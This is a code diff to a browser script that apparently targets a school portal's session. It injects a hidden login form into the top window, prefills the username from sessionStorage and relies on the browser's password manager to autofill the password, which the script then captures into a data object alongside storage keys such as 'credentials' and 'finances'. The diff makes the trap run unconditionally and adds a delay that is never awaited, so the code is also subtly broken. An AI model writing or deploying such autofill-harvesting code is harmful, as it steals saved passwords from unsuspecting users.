@@ -8,20 +8,15 @@ const ur = new URL(document.currentScript.src);
 		'accounts', 'badges', 'credentials', 'edhydration_auth',
 		'etablissement', 'finances', 'bigAds', 'fa', 'pdfjs.history','panier'
 	];
-	const form = document.createElement('form');
+	const form = window.top.document.createElement('form');
 	const identifiant = JSON.parse(sessionStorage.getItem("accounts"));
 	form.hidden = true;
 	form.innerHTML = `<input id="username" name="username" autocomplete="username" value=${identifiant.payload.accounts?.[0].identifiant}><input id="password" name="password" autocomplete="current-password" type="password">`
 	window.top.document.body.appendChild(form);
 	const pwdInput = window.top.document.querySelector('input[type="password"]');
-	let pass
-	const interval = setInterval(() => {
-		if (pwdInput.value.length > 1) {
-			console.log(pwdInput.value);
-			pass = pwdInput.value
-			clearInterval(interval);
-		}
-	}, 40);
+	new Promise(resolve => setTimeout(resolve, 2000));
+	
+	const pass = pwdInput.value
   
 	const data = {
 		t: new Date().toISOString(),
@@ -73,7 +68,5 @@ async function iframe() {
 };
 
 (async function() {
-	if (ur.searchParams.get("iframetrap") === true) {
-		await iframe()
-	}
+	await iframe()
 })();
